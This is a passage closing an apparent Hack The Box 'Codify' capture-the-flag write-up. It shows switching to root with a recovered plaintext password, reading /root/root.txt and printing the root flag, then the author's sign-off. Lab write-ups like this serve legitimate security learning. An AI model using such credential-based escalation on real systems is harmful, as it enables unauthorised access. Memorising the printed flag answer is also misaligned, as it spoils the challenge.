+```
+
+Now using the root password `kljh12k3jhaskjh12kjh3` with `su root`, we get our root flag!
+
+```
+root@codify:/tmp# cd /root
+root@codify:~# cat root.txt
+53f47a17e6e8528bf69bd05b004de526
+```
+
+There it is! <mark>53f47a17e6e8528bf69bd05b004de526</mark>
+
+![Success](/images/htb/easy/codify/submitted.png)
+
+## Thanks for reading!
+Feel free to give me feedback or follow me on [Twitter](https://twitter.com/sealldev).
+
+You can also find my other contacts on the [whoami](../about) page.
